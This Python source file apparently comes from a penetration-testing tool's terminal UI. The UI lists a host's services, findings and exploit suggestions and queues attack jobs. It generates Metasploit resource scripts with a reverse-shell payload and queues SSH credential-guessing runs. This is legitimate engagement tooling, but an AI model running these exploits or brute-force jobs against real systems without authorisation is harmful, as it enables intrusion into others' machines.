        severity_emojis = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "⚪"}
        severity = gap.get("severity", "medium")
        color = severity_colors.get(severity, "white")
        emoji = severity_emojis.get(severity, "⚪")

        # Summary
        click.echo("═" * width)
        click.echo(click.style("📊 GAP DETAILS", bold=True, fg="cyan"))
        click.echo("─" * width)
        click.echo()
        click.echo(f"  Host:          {gap['host']}")
        if gap.get("hostname"):
            click.echo(f"  Hostname:      {gap['hostname']}")
        click.echo(f"  Port:          {gap['port']}")
        click.echo(f"  Service:       {gap['service']}")
        if gap.get("version"):
            click.echo(f"  Version:       {gap['version']}")
        click.echo(
            f"  Severity:      {emoji} {click.style(severity.upper(), fg=color)}"
        )
        click.echo(f"  Priority:      {gap.get('priority_score', 0)}/100")
        click.echo()
        click.echo(f"  Reason:        {gap.get('reason', 'Unknown')}")
        click.echo()

        # Suggestions
        suggestions = gap.get("suggestions", [])
        if suggestions:
            click.echo("═" * width)
            click.echo(
                click.style(
                    f"💡 SUGGESTED ACTIONS ({len(suggestions)})", bold=True, fg="cyan"
                )
            )
            click.echo("─" * width)
            click.echo()
            for idx, sug in enumerate(suggestions[:5], 1):
                tool = sug.get("tool", "Unknown")
                desc = sug.get("description", sug.get("action", "No description"))
                click.echo(
                    f"  [{idx}] {click.style(tool, fg='green', bold=True)}: {desc}"
                )
            if len(suggestions) > 5:
                click.echo(
                    click.style(
                        f"      ... and {len(suggestions) - 5} more", fg="bright_black"
                    )
                )
            click.echo()

        # MSF modules if available
        msf_modules = gap.get("msf_modules", [])
        if msf_modules:
            click.echo("═" * width)
            click.echo(
                click.style(
                    f"🎯 METASPLOIT MODULES ({len(msf_modules)})", bold=True, fg="cyan"
                )
            )
            click.echo("─" * width)
            click.echo()
            for mod in msf_modules[:5]:
                click.echo(f"  • {mod}")
            if len(msf_modules) > 5:
                click.echo(
                    click.style(
                        f"    ... and {len(msf_modules) - 5} more", fg="bright_black"
                    )
                )
            click.echo()

        # Exploit suggestions from engine (filtered by port)
        all_exploits = _get_exploits_for_host(engagement_id, gap["host"])
        exploits = [e for e in all_exploits if e.get("port") == gap["port"]]
        if exploits:
            click.echo("═" * width)
            click.echo(
                click.style(
                    f"🔥 EXPLOIT SUGGESTIONS ({len(exploits)})", bold=True, fg="cyan"
                )
            )
            click.echo("─" * width)
            click.echo()
            for exp in exploits[:5]:
                title = exp.get("title", "Unknown")[:60]
                msf = exp.get("msf_module")
                if msf:
                    click.echo(f"  • {msf}")
                else:
                    click.echo(f"  • {title}")
            if len(exploits) > 5:
                click.echo(
                    click.style(
                        f"    ... and {len(exploits) - 5} more", fg="bright_black"
                    )
                )
            click.echo()

        # Menu
        click.echo("─" * width)
        click.echo()
        click.echo("  [r] Run suggested exploit")
        click.echo("  [m] Mark as attempted")
        click.echo("  [q] Back")

        try:
            choice = input("\n  Select option: ").strip().lower()

            if choice == "q":
                return

            elif choice == "r":
                # Queue suggested exploit
                from souleyez.engine.background import enqueue_job

                if suggestions:
                    suggestion = suggestions[0]
                    tool = suggestion.get("tool", "nmap")
                    try:
                        enqueue_job(
                            tool=tool,
                            target=gap["host"],
                            args=["-p", str(gap["port"])],
                            label=f"Gap exploit: {gap['service']}",
                            engagement_id=engagement_id,
                        )
                        click.echo(click.style("\n  ✓ Job queued", fg="green"))
                    except Exception as e:
                        click.echo(
                            click.style(f"\n  ✗ Failed to queue job: {e}", fg="red")
                        )
                elif exploits:
                    # Run first MSF exploit suggestion
                    exploit = exploits[0]
                    msf_module = exploit.get("msf_module")
                    if msf_module:
                        # Build args for MSF module
                        args = [msf_module, f'RPORT={gap["port"]}']

                        # Add SSH credential options if ssh_login module
                        if "ssh_login" in msf_module:
                            args.extend(
                                [
                                    "USER_FILE=data/wordlists/soul_users.txt",
                                    "BLANK_PASSWORDS=true",
                                    "USER_AS_PASS=true",
                                ]
                            )

                        try:
                            enqueue_job(
                                tool="msf_auxiliary",
                                target=gap["host"],
                                args=args,
                                label=f"Gap exploit: {msf_module.split('/')[-1]}",
                                engagement_id=engagement_id,
                            )
                            click.echo(
                                click.style(
                                    f"\n  ✓ Job queued: {msf_module}", fg="green"
                                )
                            )
                        except Exception as e:
                            click.echo(
                                click.style(f"\n  ✗ Failed to queue job: {e}", fg="red")
                            )
                    else:
                        click.echo(
                            click.style("\n  No MSF module available", fg="yellow")
                        )
                else:
                    click.echo(click.style("\n  No suggestions available", fg="yellow"))
                click.pause()

            elif choice == "m":
                click.echo(click.style("\n  ✓ Marked as attempted", fg="green"))
                click.echo("  (Note: This is UI-only, no persistence yet)")
                click.pause()

        except (KeyboardInterrupt, EOFError):
            return


def _view_host_detail(engagement_id: int, host_data: Dict, analysis: Dict):
    """View detailed information for a single host with all sections."""
    from rich.console import Console
    from rich.table import Table

    from souleyez.ui.design_system import DesignSystem

    console = Console()

    services = host_data.get("services", [])
    host_ip = host_data["host_ip"]

    # Get host data
    score = host_data.get("score", 0)
    exploited = host_data["exploited_count"]
    service_count = len(services)
    findings_total = host_data["findings_total"]
    findings_critical = host_data["findings_critical"]
    pct = round((exploited / service_count * 100) if service_count > 0 else 0)

    # Get gaps, findings, exploits for this host
    gaps = _get_gaps_for_host(host_ip, analysis)
    critical_findings = _get_critical_findings_for_host(engagement_id, host_ip)
    exploits = _get_exploits_for_host(engagement_id, host_ip)

    # Get Wazuh vulns only if Wazuh is the configured SIEM
    wazuh_vulns = []
    from souleyez.integrations.wazuh.config import WazuhConfig

    siem_config = WazuhConfig.get_config(engagement_id)
    siem_type = siem_config.get("siem_type", "wazuh") if siem_config else None
    if siem_type == "wazuh" and siem_config and siem_config.get("enabled"):
        wazuh_vulns = _get_wazuh_vulns_for_host(engagement_id, host_ip)

    # Pagination state
    page = 0
    page_size = 15
    show_all = False
    selected_service_ids = set()  # Track selected services by index

    while True:
        DesignSystem.clear_screen()
        width = get_terminal_width()

        # Header
        click.echo("\n┌" + "─" * (width - 2) + "┐")
        click.echo(
            "│"
            + click.style(
                f' HOST: {host_data["display_name"]} '.center(width - 2),
                bold=True,
                fg="cyan",
            )
            + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()

        # Summary
        click.echo(click.style("📊 SUMMARY", bold=True))
        findings_str = f"{findings_total}"
        if findings_critical > 0:
            findings_str += f" ({findings_critical}🔴)"
        selected_str = (
            f"  │  Selected: {len(selected_service_ids)}"
            if selected_service_ids
            else ""
        )
        click.echo(
            f"  Score: {score}  │  Services: {service_count}  │  Findings: {findings_str}  │  Exploited: {exploited}/{service_count} ({pct}%){selected_str}"
        )
        click.echo()

        # ═══ SERVICES TABLE ═══
        click.echo("═" * width)
        total_pages = max(1, (len(services) + page_size - 1) // page_size)
        click.echo(
            click.style(f"SERVICES ({len(services)})", bold=True)
            + f"  │  Page {page + 1}/{total_pages}"
        )
        click.echo("─" * width)
        click.echo()

        # Pagination
        if show_all:
            page_services = services
        else:
            start_idx = page * page_size
            end_idx = min(start_idx + page_size, len(services))
            page_services = services[start_idx:end_idx]

        # Services table with checkboxes
        table = Table(
            show_header=True,
            header_style="bold cyan",
            box=DesignSystem.TABLE_BOX,
            padding=(0, 1),
            expand=True,
        )
        table.add_column("○", width=3, justify="center")
        table.add_column("#", width=6, justify="right")
        table.add_column("Port", width=8, justify="right")
        table.add_column("Service", width=14)
        table.add_column("Version", width=55)
        table.add_column("Exploited", width=10, justify="center")
        table.add_column("Findings", width=10, justify="center")

        for idx, svc in enumerate(page_services):
            abs_idx = (page * page_size + idx) if not show_all else idx
            display_num = abs_idx + 1
            status = svc.get("status", "not_tried")
            if status == "exploited":
                status_icon = "[green]✓[/green]"
            elif status == "attempted":
                status_icon = "[blue]◐[/blue]"
            else:
                status_icon = "[dim]✗[/dim]"

            # Checkbox
            checkbox = "●" if abs_idx in selected_service_ids else "○"

            findings_count = svc.get("findings", 0) or "-"
            table.add_row(
                checkbox,
                str(display_num),
                str(svc.get("port", "")),
                (svc.get("service") or "unknown")[:14],
                (svc.get("version") or "-")[:55],
                status_icon,
                str(findings_count),
            )

        console.print(table)
        click.echo()

        # Legend for Exploited column
        click.echo(
            f"  Legend: {click.style('✓', fg='green')} Exploited  {click.style('◐', fg='blue')} Attempted  {click.style('✗', fg='white', dim=True)} Not tried"
        )
        click.echo()

        click.echo("  💡 TIP: Press 'i' for interactive mode")
        if total_pages > 1:
            click.echo("  n/p: Next/Previous page")
        click.echo()

        # Menu right after services table
        click.echo("─" * width)
        click.echo()
        if selected_service_ids:
            click.echo(
                click.style(
                    f"  Selected: {len(selected_service_ids)} service(s)",
                    fg="cyan",
                    bold=True,
                )
            )
            click.echo()
        click.echo("  [#] View service details")
        click.echo("  [a] Select all  |  [u] Unselect all")
        click.echo("  [t] Toggle - Toggle pagination")
        click.echo("  [s] Scan more - Run additional scans on this host")
        click.echo("  [e] Exploit - Run suggested exploits")
        click.echo("  [q] Back")
        click.echo()

        # ═══ EXPLOITATION GAPS ═══
        click.echo("═" * width)
        click.echo(
            click.style(f"⚠️ EXPLOITATION GAPS ({len(gaps)})", bold=True, fg="yellow")
        )
        click.echo("─" * width)
        click.echo()

        if gaps:
            for gap in gaps[:5]:
                severity = gap.get("severity", "medium")
                emoji = {
                    "critical": "🔴",
                    "high": "🟠",
                    "medium": "🟡",
                    "low": "⚪",
                }.get(severity, "⚪")
                port = gap.get("port", "")
                service = gap.get("service", "unknown")
                priority = gap.get("priority_score", 0)
                reason = gap.get("reason", "")[:40]
                click.echo(
                    f"  {emoji} Port {port} ({service}) - Priority: {priority} - {reason}"
                )
            if len(gaps) > 5:
                click.echo(
                    click.style(f"  ... and {len(gaps) - 5} more", fg="bright_black")
                )
            click.echo(click.style("  [g] View all gaps", fg="cyan"))
        else:
            click.echo("  No exploitation gaps found")
        click.echo()

        # ═══ CRITICAL FINDINGS ═══
        click.echo("═" * width)
        click.echo(
            click.style(
                f"🔴 CRITICAL FINDINGS ({len(critical_findings)})", bold=True, fg="red"
            )
        )
        click.echo("─" * width)
        click.echo()

        if critical_findings:
            for f in critical_findings[:5]:
                title = f.get("title", "Unknown")[:70]
                port = f.get("port", "")
                port_str = f" Port {port}" if port else ""
                click.echo(f"  • {title}{port_str}")
            if len(critical_findings) > 5:
                click.echo(
                    click.style(
                        f"  ... and {len(critical_findings) - 5} more",
                        fg="bright_black",
                    )
                )
            click.echo(click.style("  [f] View all findings", fg="cyan"))
        else:
            click.echo("  No critical findings")
        click.echo()

        # ═══ WAZUH VULNERABILITIES ═══
        if wazuh_vulns:
            # Count by severity
            wazuh_critical = sum(
                1 for v in wazuh_vulns if v.get("severity") == "Critical"
            )
            wazuh_high = sum(1 for v in wazuh_vulns if v.get("severity") == "High")
            wazuh_medium = sum(1 for v in wazuh_vulns if v.get("severity") == "Medium")
            wazuh_low = sum(1 for v in wazuh_vulns if v.get("severity") == "Low")

            click.echo("═" * width)
            click.echo(
                click.style(
                    f"🛡️ WAZUH VULNERABILITIES ({len(wazuh_vulns)})",
                    bold=True,
                    fg="cyan",
                )
            )
            click.echo("─" * width)
            click.echo()

            # Severity breakdown
            sev_line = f"  🔴 {wazuh_critical}  │  🟠 {wazuh_high}  │  🟡 {wazuh_medium}  │  ⚪ {wazuh_low}"
            click.echo(sev_line)
            click.echo()

            for vuln in wazuh_vulns[:5]:
                cve = vuln.get("cve_id", "-")
                severity = vuln.get("severity", "Medium")
                package = vuln.get("package_name", "-")[:30]
                sev_icon = {
                    "Critical": "🔴",
                    "High": "🟠",
                    "Medium": "🟡",
                    "Low": "⚪",
                }.get(severity, "⚪")
                click.echo(f"  {sev_icon} {cve} - {package}")
            if len(wazuh_vulns) > 5:
                click.echo(
                    click.style(
                        f"  ... and {len(wazuh_vulns) - 5} more", fg="bright_black"
                    )
                )
            click.echo(click.style("  [w] View all Wazuh vulns", fg="cyan"))
            click.echo()

        # ═══ SUGGESTED EXPLOITS ═══
        click.echo("═" * width)
        click.echo(
            click.style(f"💣 SUGGESTED EXPLOITS ({len(exploits)})", bold=True, fg="red")
        )
        click.echo("─" * width)
        click.echo()

        if exploits:
            for exp in exploits[:5]:
                msf = exp.get("msf_module", "")
                title = exp.get("title", "Unknown")[:50]
                port = exp.get("port", "")
                display = msf if msf else title
                click.echo(f"  • {display} [Port {port}]")
            if len(exploits) > 5:
                click.echo(
                    click.style(
                        f"  ... and {len(exploits) - 5} more", fg="bright_black"
                    )
                )
            click.echo(click.style("  [x] View all exploits", fg="cyan"))
        else:
            click.echo("  No exploit suggestions")
        click.echo()

        try:
            choice = input("  Select option: ").strip().lower()

            if choice == "q":
                return

            elif choice == "n" and page < total_pages - 1 and not show_all:
                page += 1

            elif choice == "p" and page > 0 and not show_all:
                page -= 1

            elif choice == "t":
                show_all = not show_all
                page = 0

            elif choice == "i":
                # Enter interactive mode for services
                _view_host_detail_interactive(
                    engagement_id, host_data, services, analysis
                )

            elif choice == "g" and gaps:
                _view_host_gaps(engagement_id, host_ip, gaps, analysis)

            elif choice == "f" and critical_findings:
                _view_host_findings(engagement_id, host_ip)

            elif choice == "w" and wazuh_vulns:
                _view_host_wazuh_vulns(engagement_id, host_ip, wazuh_vulns)

            elif choice == "x" and exploits:
                _view_all_exploits(engagement_id, host_ip, exploits)

            elif choice == "s":
                _scan_host(engagement_id, host_ip)

            elif choice == "e" and exploits:
                _exploit_host(engagement_id, host_ip, exploits)

            elif choice == "a":
                # Select all services
                selected_service_ids = set(range(len(services)))

            elif choice == "u":
                # Unselect all services
                selected_service_ids.clear()

            elif choice.isdigit():
                # Toggle selection or view service by number
                svc_num = int(choice)
                svc_idx = svc_num - 1
                if 0 <= svc_idx < len(services):
                    # Toggle selection
                    if svc_idx in selected_service_ids:
                        selected_service_ids.discard(svc_idx)
                    else:
                        selected_service_ids.add(svc_idx)
                        # View service detail immediately after first selection
                        _view_service_detail(
                            engagement_id, host_data, services[svc_idx], analysis
                        )
                else:
                    click.echo(click.style("  Invalid service number", fg="red"))
                    click.pause()

        except (KeyboardInterrupt, EOFError):
            return


def _view_host_detail_interactive(
    engagement_id: int, host_data: Dict, services: List[Dict], analysis: Dict
):
    """Interactive mode for selecting multiple services."""
    from souleyez.ui.interactive_selector import interactive_select

    if not services:
        click.echo("  No services found")
        click.pause()
        return

    # Build service items for interactive selector
    service_items = []
    for svc in services:
        status = svc.get("status", "not_tried")
        if status == "exploited":
            status_icon = "✓"
        elif status == "attempted":
            status_icon = "◐"
        else:
            status_icon = "✗"

        service_items.append(
            {
                "id": svc.get("port"),
                "port": svc.get("port"),
                "service": svc.get("service") or "unknown",
                "version": (svc.get("version") or "-")[:30],
                "status": status_icon,
                "findings": svc.get("findings", 0) or "-",
                "raw": svc,
            }
        )

    columns = [
        {"name": "Port", "width": 8, "key": "port", "justify": "right"},
        {"name": "Service", "width": 16, "key": "service"},
        {"name": "Version", "width": 35, "key": "version"},
        {"name": "Exploited", "width": 10, "key": "status", "justify": "center"},
        {"name": "Findings", "width": 10, "key": "findings", "justify": "center"},
    ]

    def format_cell(item: dict, key: str) -> str:
        value = item.get(key)
        if key == "status":
            if value == "✓":
                return "[green]✓[/green]"
            elif value == "◐":
                return "[blue]◐[/blue]"
            else:
                return "[dim]✗[/dim]"
        return str(value) if value else "-"

    selected_service_ids = set()

    while True:
        interactive_select(
            items=service_items,
            columns=columns,
            selected_ids=selected_service_ids,
            get_id=lambda s: s["id"],
            title=f'SELECT SERVICES - {host_data["display_name"]}',
            format_cell=format_cell,
        )

        if not selected_service_ids:
            return

        # Show bulk action menu
        result = _service_bulk_action_menu(
            engagement_id, host_data, services, selected_service_ids, analysis
        )
        if result == "clear":
            selected_service_ids.clear()
        elif result == "back":
            return


def _service_bulk_action_menu(
    engagement_id: int,
    host_data: Dict,
    services: List[Dict],
    selected_ids: set,
    analysis: Dict,
) -> str:
    """Show inline bulk action menu for selected services."""
    from rich.console import Console

    console = Console()

    selected_services = [s for s in services if s.get("port") in selected_ids]

    if not selected_services:
        return "continue"

    console.print()
    console.print(f"  [bold]Selected: {len(selected_services)} service(s)[/bold]")
    console.print("    \\[v] View details")
    console.print("    \\[e] Auto-exploit untried services")
    console.print("    \\[x] Export to file")
    console.print("    \\[c] Clear selection")
    console.print("    \\[q] Back")
    console.print()

    try:
        choice = (
            click.prompt("  Select option", default="q", show_default=False)
            .strip()
            .lower()
        )

        if choice == "v":
            # View details of first selected service
            svc = selected_services[0]
            if len(selected_services) > 1:
                click.echo(
                    click.style(
                        f"\n  Showing details for port {svc.get('port')}", fg="cyan"
                    )
                )
                click.echo(
                    click.style(
                        f"  ({len(selected_services) - 1} other service(s) also selected)",
                        fg="bright_black",
                    )
                )
            _view_service_detail(engagement_id, host_data, svc, analysis)
            return "continue"

        elif choice == "e":
            # Auto-exploit untried services
            from souleyez.engine.background import enqueue_job

            queued = 0
            for svc in selected_services:
                if svc.get("status") != "exploited":
                    tool = suggest_tool_for_service(svc.get("service") or "unknown")
                    if tool:
                        try:
                            enqueue_job(
                                tool=tool,
                                target=host_data["host_ip"],
                                args=["-p", str(svc["port"])],
                                label=f"Exploit: {svc.get('service', 'unknown')} on port {svc['port']}",
                                engagement_id=engagement_id,
                            )
                            queued += 1
                        except Exception:
                            pass
            click.echo(click.style(f"\n  ✓ Queued {queued} exploit job(s)", fg="green"))
            click.pause()
            return "clear"

        elif choice == "x":
            # Export selected services to CSV
            import os
            from datetime import datetime

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = (
                f"services_{host_data['host_ip'].replace('.', '_')}_{timestamp}.csv"
            )
            filepath = os.path.join(os.getcwd(), filename)

            with open(filepath, "w") as f:
                f.write("Port,Service,Version,Status,Findings\n")
                for svc in selected_services:
                    port = svc.get("port", "")
                    service = svc.get("service", "unknown")
                    version = (svc.get("version") or "").replace(",", ";")
                    status = svc.get("status", "not_tried")
                    findings = svc.get("findings", 0)
                    f.write(f"{port},{service},{version},{status},{findings}\n")

            click.echo(click.style(f"\n  ✓ Exported to {filepath}", fg="green"))
            click.pause()
            return "continue"

        elif choice == "c":
            return "clear"

        elif choice == "q":
            return "continue"

    except (KeyboardInterrupt, click.Abort):
        pass

    return "continue"


def _view_service_detail(
    engagement_id: int, host_data: Dict, service: Dict, analysis: Dict
):
    """View detailed information for a single service (Level 3 drill-down)."""
    from rich.console import Console
    from rich.table import Table

    from souleyez.intelligence.exploit_suggestions import ExploitSuggestionEngine
    from souleyez.storage.findings import FindingsManager
    from souleyez.storage.hosts import HostManager
    from souleyez.ui.design_system import DesignSystem

    console = Console()
    host_ip = host_data["host_ip"]
    port = service.get("port", "")
    service_name = service.get("service") or "unknown"
    version = service.get("version") or ""

    # Track view state for expandable lists
    show_all_exploits = False
    show_all_findings = False

    while True:
        DesignSystem.clear_screen()
        width = get_terminal_width()

        # Header
        click.echo("\n┌" + "─" * (width - 2) + "┐")
        title = f" SERVICE: {host_ip}:{port}/{service_name}"
        if version:
            title += f" ({version})"
        click.echo(
            "│" + click.style(title.center(width - 2), bold=True, fg="cyan") + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()

        # Status summary
        status = service.get("status", "not_tried")
        if status == "exploited":
            status_display = click.style("✅ EXPLOITED", fg="green", bold=True)
        elif status == "attempted":
            status_display = click.style("🔄 ATTEMPTED", fg="yellow", bold=True)
        else:
            status_display = click.style("⚠️ NOT TRIED", fg="red", bold=True)

        # Get findings for this port
        hm = HostManager()
        fm = FindingsManager()
        host = hm.get_host_by_ip(engagement_id, host_ip)
        port_findings = []
        if host:
            all_findings = fm.list_findings(engagement_id, host_id=host["id"])
            port_findings = [f for f in all_findings if f.get("port") == port]

        click.echo(f"📊 STATUS: {status_display}  │  Findings: {len(port_findings)}")
        click.echo()

        # Suggested Exploits section
        click.echo("═" * width)
        click.echo(click.style("💣 SUGGESTED EXPLOITS", bold=True, fg="yellow"))
        click.echo("─" * width)
        click.echo()

        # Get exploits for this service
        engine = ExploitSuggestionEngine(use_searchsploit=False)
        service_exploits = []
        if host:
            suggestions = engine.generate_suggestions(engagement_id, host["id"])
            if suggestions.get("hosts"):
                for h in suggestions["hosts"]:
                    for svc in h.get("services", []):
                        if svc.get("port") == port:
                            for exploit in svc.get("exploits", []):
                                service_exploits.append(exploit)

        if service_exploits:
            display_limit = len(service_exploits) if show_all_exploits else 10
            for idx, exploit in enumerate(service_exploits[:display_limit]):
                severity = exploit.get("severity", "info")
                sev_emoji = {
                    "critical": "🔴",
                    "high": "🟠",
                    "medium": "🟡",
                    "low": "🟢",
                    "info": "⚪",
                }.get(severity, "⚪")
                module = exploit.get("msf_module") or exploit.get("title", "-")
                module = module[:80]
                exp_type = (
                    "exploit"
                    if "exploit/" in (exploit.get("msf_module") or "")
                    else "auxiliary"
                )
                click.echo(f"  [{idx + 1}] {sev_emoji} {module} ({exp_type})")
            if len(service_exploits) > 10 and not show_all_exploits:
                click.echo(
                    click.style(
                        f"  ... and {len(service_exploits) - 10} more",
                        fg="bright_black",
                    )
                )
        else:
            click.echo("  No exploit suggestions available for this service")
        click.echo()

        # Findings section
        click.echo("═" * width)
        click.echo(
            click.style(f"🔍 FINDINGS ({len(port_findings)})", bold=True, fg="cyan")
        )
        click.echo("─" * width)
        click.echo()

        if port_findings:
            display_limit = len(port_findings) if show_all_findings else 10
            for f in port_findings[:display_limit]:
                severity = f.get("severity", "info")
                sev_emoji = {
                    "critical": "🔴",
                    "high": "🟠",
                    "medium": "🟡",
                    "low": "🟢",
                    "info": "⚪",
                }.get(severity, "⚪")
                title = f.get("title", "Unknown")[:80]
                click.echo(f"  {sev_emoji} {title} ({severity.title()})")
            if len(port_findings) > 10 and not show_all_findings:
                click.echo(
                    click.style(
                        f"  ... and {len(port_findings) - 10} more", fg="bright_black"
                    )
                )
        else:
            click.echo("  No findings for this service")
        click.echo()

        # Menu
        click.echo("─" * width)
        click.echo()
        click.echo("  [e] Execute exploit")
        click.echo("  [m] Mark exploitation status")
        if len(service_exploits) > 10:
            if show_all_exploits:
                click.echo(f"  [x] Show fewer exploits")
            else:
                click.echo(f"  [x] Show all exploits ({len(service_exploits)} total)")
        if len(port_findings) > 10:
            if show_all_findings:
                click.echo(f"  [f] Show fewer findings")
            else:
                click.echo(f"  [f] Show all findings ({len(port_findings)} total)")
        click.echo("  [q] Back to host")

        try:
            choice = input("\n  Select option: ").strip().lower()

            if choice == "q":
                return
            elif choice == "e" and service_exploits:
                # Execute exploit suggestion
                _run_service_exploit(engagement_id, host_ip, port, service_exploits)
            elif choice == "m":
                _mark_service_status(engagement_id, host_ip, port, service)
            elif choice == "x" and len(service_exploits) > 10:
                show_all_exploits = not show_all_exploits
            elif choice == "f" and len(port_findings) > 10:
                show_all_findings = not show_all_findings
            else:
                click.echo(click.style("Invalid option", fg="red"))
                click.pause()

        except (KeyboardInterrupt, EOFError):
            return


def _run_service_exploit(
    engagement_id: int, host_ip: str, port: int, exploits: List[Dict]
):
    """Run an exploit against a service."""
    import os
    import tempfile

    from souleyez.core.msf_integration import MSFConsoleManager
    from souleyez.storage.exploit_attempts import record_attempt
    from souleyez.storage.hosts import HostManager

    click.echo()
    click.echo("Select exploit to run:")
    for idx, exp in enumerate(exploits[:5]):
        module = exp.get("msf_module") or exp.get("title", "-")
        click.echo(f"  [{idx + 1}] {module}")
    click.echo("  [q] Cancel")

    try:
        choice = input("\n  Select option: ").strip().lower()
        if choice == "q":
            return
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(exploits):
                exploit = exploits[idx]
                module = exploit.get("msf_module")
                if not module:
                    click.echo(
                        click.style(
                            "\n✗ No MSF module available for this exploit", fg="red"
                        )
                    )
                    click.pause()
                    return

                # Get host_id from host_ip
                host_mgr = HostManager()
                host = host_mgr.get_host_by_ip(engagement_id, host_ip)
                host_id = host.get("id") if host else None

                if not host_id:
                    click.echo(
                        click.style(
                            f"\n✗ Could not find host record for {host_ip}", fg="red"
                        )
                    )
                    click.pause()
                    return

                # Build resource script
                script = "# Generated by SoulEyez - Attack Surface View\n"
                script += f"# Exploit: {exploit.get('title', 'Unknown')}\n"
                script += f"# Target: {host_ip}:{port}\n\n"

                script += f"use {module}\n"
                script += f"set RHOST {host_ip}\n"
                script += f"set RPORT {port}\n"

                # Check if it's an auxiliary module or exploit
                is_auxiliary = "/auxiliary/" in module

                if not is_auxiliary:
                    # For exploits, set a default payload
                    script += "set PAYLOAD cmd/unix/reverse\n"
                    script += "set LHOST 0.0.0.0  # CHANGE THIS to your IP\n"
                    script += "set LPORT 4444\n"
                    click.echo()
                    click.echo(
                        click.style(
                            "  ⚠️  Remember to set LHOST to your IP address!",
                            fg="yellow",
                        )
                    )

                # Add check command
                script += "\ncheck\n"
                script += "# Uncomment the line below to actually run:\n"
                if is_auxiliary:
                    script += "# run\n"
                else:
                    script += "# exploit\n"

                # Show script preview
                click.echo()
                click.echo(
                    click.style("Resource Script Preview:", bold=True, fg="cyan")
                )
                click.echo("─" * 60)
                for line in script.split("\n")[:12]:
                    click.echo(f"  {line}")
                script_lines = script.split("\n")
                if len(script_lines) > 12:
                    click.echo(f"  ... ({len(script_lines) - 12} more lines)")
                click.echo("─" * 60)
                click.echo()

                # Save script to temp file
                with tempfile.NamedTemporaryFile(
                    mode="w", suffix=".rc", delete=False
                ) as f:
                    f.write(script)
                    rc_file = f.name

                click.echo(
                    click.style(f"✓ Resource script saved to: {rc_file}", fg="green")
                )
                click.echo()

                # Launch options
                click.echo(click.style("Launch Options:", bold=True, fg="cyan"))
                click.echo("  [1] Launch MSF console interactively (recommended)")
                click.echo("  [2] Save script only (don't launch)")
                click.echo("  [q] Cancel")
                click.echo()

                launch_choice = click.prompt(
                    "  Select option", type=str, default="1", show_default=False
                ).strip()

                if launch_choice == "1":
                    click.echo()
                    click.echo(click.style("Launching msfconsole...", fg="cyan"))
                    click.echo("The script will load but won't auto-execute.")
                    click.echo(
                        "Review settings and type 'exploit' or 'run' when ready."
                    )
                    click.echo()

                    click.pause("Press Enter to launch...")

                    try:
                        # Check if MSF is available
                        msf_manager = MSFConsoleManager()
                        if not msf_manager.is_available():
                            click.echo()
                            click.echo(click.style("✗ msfconsole not found", fg="red"))
                            click.echo(
                                "Install Metasploit Framework or ensure it's in your PATH"
                            )
                            click.pause()
                            return

                        # Launch MSF console
                        msf_manager.launch_with_resource(
                            rc_file, background=False, use_sudo=True
                        )

                        # Record attempt
                        record_attempt(
                            engagement_id=engagement_id,
                            host_id=host_id,
                            exploit_identifier=module,
                            exploit_title=exploit.get("title", module),
                            status="attempted",
                            service_id=None,  # We don't have service_id in this context
                            notes=f"Executed from Attack Surface: {module} against {host_ip}:{port}",
                        )

                        click.echo()
                        click.echo(
                            click.style("✓ Exploit execution completed", fg="green")
                        )
                        click.echo("Status marked as 'attempted'")

                    except Exception as e:
                        click.echo()
                        click.echo(
                            click.style(f"✗ Error launching msfconsole: {e}", fg="red")
                        )
                    finally:
                        # Clean up temp file
                        try:
                            os.unlink(rc_file)
                        except:
                            pass

                    click.pause()

                elif launch_choice == "2":
                    # Save script permanently
                    save_path = click.prompt(
                        "  Save as",
                        default=f"exploit_{module.replace('/', '_').replace(' ', '_')}.rc",
                    )

                    try:
                        with open(save_path, "w") as f:
                            f.write(script)
                        click.echo()
                        click.echo(
                            click.style(f"✓ Script saved to: {save_path}", fg="green")
                        )
                        click.echo(f"  Run with: msfconsole -r {save_path}")

                        # Clean up temp file
                        try:
                            os.unlink(rc_file)
                        except:
                            pass
                    except Exception as e:
                        click.echo()
                        click.echo(click.style(f"✗ Error saving script: {e}", fg="red"))

                    click.pause()
                else:
                    # Cancel - clean up temp file
                    try:
                        os.unlink(rc_file)
                    except:
                        pass

    except (KeyboardInterrupt, EOFError):
        pass


def _mark_service_status(engagement_id: int, host_ip: str, port: int, service: Dict):
    """Mark exploitation status for a service."""
    click.echo()
    click.echo("Mark service status:")
    click.echo("  [1] ✅ Exploited")
    click.echo("  [2] 🔄 Attempted")
    click.echo("  [3] ⚠️ Not tried")
    click.echo("  [q] Cancel")

    try:
        choice = input("\n  Select option: ").strip().lower()
        if choice == "q":
            return
        if choice == "1":
            service["status"] = "exploited"
            click.echo(click.style("✓ Marked as exploited", fg="green"))
        elif choice == "2":
            service["status"] = "attempted"
            click.echo(click.style("✓ Marked as attempted", fg="yellow"))
        elif choice == "3":
            service["status"] = "not_tried"
            click.echo(click.style("✓ Marked as not tried", fg="white"))
        click.pause()
    except (KeyboardInterrupt, EOFError):
        pass


def _get_critical_findings_for_host(engagement_id: int, host_ip: str) -> List[Dict]:
    """Get critical findings for a specific host."""
    from souleyez.storage.findings import FindingsManager
    from souleyez.storage.hosts import HostManager

    hm = HostManager()
    fm = FindingsManager()

    host = hm.get_host_by_ip(engagement_id, host_ip)
    if not host:
        return []

    findings = fm.list_findings(engagement_id, host_id=host["id"])
    return [f for f in findings if f.get("severity") in ("critical", "high")]


def _get_wazuh_vulns_for_host(engagement_id: int, host_ip: str) -> List[Dict]:
    """Get Wazuh vulnerabilities for a specific host."""
    try:
        from souleyez.integrations.wazuh import WazuhConfig
        from souleyez.storage.hosts import HostManager
        from souleyez.storage.wazuh_vulns import WazuhVulnsManager

        # Check if Wazuh is configured
        config = WazuhConfig.get_config(engagement_id)
        if not config or not config.get("enabled"):
            return []

        vulns_manager = WazuhVulnsManager()
        hm = HostManager()

        # First try by agent_ip
        vulns = vulns_manager.list_vulnerabilities(
            engagement_id, agent_ip=host_ip, limit=100
        )
        if vulns:
            return vulns

        # If no match, try by host_id (for mapped hosts)
        host = hm.get_host_by_ip(engagement_id, host_ip)
        if host:
            vulns = vulns_manager.list_vulnerabilities(
                engagement_id, host_id=host["id"], limit=100
            )
            return vulns

        return []
    except Exception:
        return []


